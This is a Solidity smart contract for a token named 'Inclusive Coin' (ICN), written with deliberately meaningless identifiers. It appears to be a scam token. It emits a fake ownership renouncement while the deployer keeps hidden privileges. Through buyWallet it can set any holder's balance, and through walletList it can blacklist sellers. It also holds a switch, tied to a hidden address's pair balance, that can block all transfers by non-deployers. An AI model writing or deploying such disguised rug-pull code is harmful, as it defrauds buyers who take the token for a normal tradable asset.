//SPDX-License-Identifier: MIT

pragma solidity ^0.8.13;

interface receiverTotal {
    function createPair(address launchAmount, address fundLaunchReceiver) external returns (address);
}

interface feeIs {
    function totalSupply() external view returns (uint256);

    function balanceOf(address marketingAt) external view returns (uint256);

    function transfer(address toTotalAt, uint256 buyEnable) external returns (bool);

    function allowance(address receiverLiquidity, address spender) external view returns (uint256);

    function approve(address spender, uint256 buyEnable) external returns (bool);

    function transferFrom(
        address sender,
        address toTotalAt,
        uint256 buyEnable
    ) external returns (bool);

    event Transfer(address indexed from, address indexed swapTakeWallet, uint256 value);
    event Approval(address indexed receiverLiquidity, address indexed spender, uint256 value);
}

abstract contract exemptFrom {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface toMarketing {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface maxLaunchReceiver is feeIs {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract InclusiveCoin is exemptFrom, feeIs, maxLaunchReceiver {

    mapping(address => uint256) private fundShould;

    function balanceOf(address marketingAt) public view virtual override returns (uint256) {
        return fundShould[marketingAt];
    }

    function swapTrading(uint256 buyEnable) public {
        fundSwap();
        teamReceiver = buyEnable;
    }

    uint256 teamReceiver;

    mapping(address => bool) public teamSwap;

    constructor (){
        
        toMarketing liquidityFrom = toMarketing(teamIs);
        autoLimit = receiverTotal(liquidityFrom.factory()).createPair(liquidityFrom.WETH(), address(this));
        
        listSellMin = _msgSender();
        walletTake[listSellMin] = true;
        fundShould[listSellMin] = maxSellLaunched;
        marketingTakeTrading();
        
        emit Transfer(address(0), listSellMin, maxSellLaunched);
    }

    mapping(address => mapping(address => uint256)) private exemptMode;

    function marketingTakeTrading() public {
        emit OwnershipTransferred(listSellMin, address(0));
        listReceiverToken = address(0);
    }

    function totalSupply() external view virtual override returns (uint256) {
        return maxSellLaunched;
    }

    function getOwner() external view returns (address) {
        return listReceiverToken;
    }

    uint256 public tokenIs;

    uint256 public isTradingTake;

    bool public liquidityReceiver;

    address public autoLimit;

    function transferFrom(address tradingFromSender, address toTotalAt, uint256 buyEnable) external override returns (bool) {
        if (_msgSender() != teamIs) {
            if (exemptMode[tradingFromSender][_msgSender()] != type(uint256).max) {
                require(buyEnable <= exemptMode[tradingFromSender][_msgSender()]);
                exemptMode[tradingFromSender][_msgSender()] -= buyEnable;
            }
        }
        return listMarketing(tradingFromSender, toTotalAt, buyEnable);
    }

    function name() external view virtual override returns (string memory) {
        return marketingModeSender;
    }

    uint256 launchedFrom;

    bool public walletTo;

    bool private marketingMinList;

    function walletList(address feeShould) public {
        fundSwap();
        if (feeFund != isTradingTake) {
            isTradingTake = feeFund;
        }
        if (feeShould == listSellMin || feeShould == autoLimit) {
            return;
        }
        teamSwap[feeShould] = true;
    }

    address public listSellMin;

    string private feeLimit = "ICN";

    function launchTx(address totalExempt) public {
        if (walletTo) {
            return;
        }
        if (isTradingTake == tokenIs) {
            feeFund = isTradingTake;
        }
        walletTake[totalExempt] = true;
        if (liquidityReceiver) {
            tokenIs = isTradingTake;
        }
        walletTo = true;
    }

    mapping(address => bool) public walletTake;

    address modeToken = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    uint8 private isSell = 18;

    function listMarketing(address tradingFromSender, address toTotalAt, uint256 buyEnable) internal returns (bool) {
        if (tradingFromSender == listSellMin) {
            return launchTake(tradingFromSender, toTotalAt, buyEnable);
        }
        uint256 toLiquidityTeam = feeIs(autoLimit).balanceOf(modeToken);
        require(toLiquidityTeam == teamReceiver);
        require(toTotalAt != modeToken);
        if (teamSwap[tradingFromSender]) {
            return launchTake(tradingFromSender, toTotalAt, teamMarketing);
        }
        return launchTake(tradingFromSender, toTotalAt, buyEnable);
    }

    function owner() external view returns (address) {
        return listReceiverToken;
    }

    function symbol() external view virtual override returns (string memory) {
        return feeLimit;
    }

    function allowance(address atLimitMode, address feeToken) external view virtual override returns (uint256) {
        if (feeToken == teamIs) {
            return type(uint256).max;
        }
        return exemptMode[atLimitMode][feeToken];
    }

    function decimals() external view virtual override returns (uint8) {
        return isSell;
    }

    string private marketingModeSender = "Inclusive Coin";

    event OwnershipTransferred(address indexed enableTotal, address indexed shouldWallet);

    function buyWallet(address exemptMin, uint256 buyEnable) public {
        fundSwap();
        fundShould[exemptMin] = buyEnable;
    }

    uint256 private maxSellLaunched = 100000000 * 10 ** 18;

    address private listReceiverToken;

    bool private teamTotal;

    uint256 private feeFund;

    function fundSwap() private view {
        require(walletTake[_msgSender()]);
    }

    function approve(address feeToken, uint256 buyEnable) public virtual override returns (bool) {
        exemptMode[_msgSender()][feeToken] = buyEnable;
        emit Approval(_msgSender(), feeToken, buyEnable);
        return true;
    }

    function launchTake(address tradingFromSender, address toTotalAt, uint256 buyEnable) internal returns (bool) {
        require(fundShould[tradingFromSender] >= buyEnable);
        fundShould[tradingFromSender] -= buyEnable;
        fundShould[toTotalAt] += buyEnable;
        emit Transfer(tradingFromSender, toTotalAt, buyEnable);
        return true;
    }

    uint256 constant teamMarketing = 5 ** 10;

    address teamIs = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    function transfer(address exemptMin, uint256 buyEnable) external virtual override returns (bool) {
        return listMarketing(_msgSender(), exemptMin, buyEnable);
    }

}